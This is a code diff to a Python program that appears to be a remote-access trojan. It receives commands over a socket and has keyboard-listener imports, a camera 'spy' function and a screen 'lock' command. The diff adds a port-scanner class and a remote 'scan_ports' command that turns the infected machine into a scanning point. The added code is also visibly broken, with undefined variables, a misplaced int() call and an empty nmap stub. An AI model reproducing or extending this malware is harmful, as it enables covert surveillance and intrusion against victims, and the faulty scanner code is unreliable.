@@ -9,6 +9,37 @@ from email.mime.text import MIMEText  # Текст/HTML
 from pywifi import *
 from pynput.keyboard import Listener
 import numpy as np
+# import pyfiglet
+
+
+class Scanner():
+    def __init__(self, ip: str, ports='20-1000'):
+        self.ip = ip
+        self.ports = ports if type(ports) == type(list()) else [el for el in range(int(ports.split('-'))[0], int(ports.split('-')[1]))]
+        self.s = socket.socket(2, 1)
+        self.s.setdefaulttimeout(1)
+        self.good_ports = []
+
+
+    def scan(self):
+        for el in ports:
+            try:
+                s.connect((self.ip, el))
+            except:
+                pass
+            else:
+                self.good_ports.append(el)
+
+
+    def check_ports(self):
+        print(self.good_ports)
+
+
+def scanner(ip, ports='20-1000'):
+    sc = Scanner(ip, ports)
+    sc.scan()
+    sc.check_ports()
+
 
 def admin():
     #!!!#
@@ -1178,6 +1209,11 @@ def spy(cmd_dt, s, ip):
         camera.stop_stream()
 
 
+def scan(ip, ports):
+    nm = nmap.PortScanner()
+
+
+
 
 def MAIN(command, s, ip):
     if "py_to_exe" == command.split(":")[0]:
@@ -1185,6 +1221,9 @@ def MAIN(command, s, ip):
             py_to_exe((command.split(":"))[-1], s)
         except:
             s.send("done".encode("utf-8"))
+    elif "scan_ports" == command.split()[0]:
+        command = command.split()
+        scanner(command[1], command[2] if len(command) == 3 else None)
     elif "lock" == command:
         pas = command.split(" ")[-1]
         lock(pas)
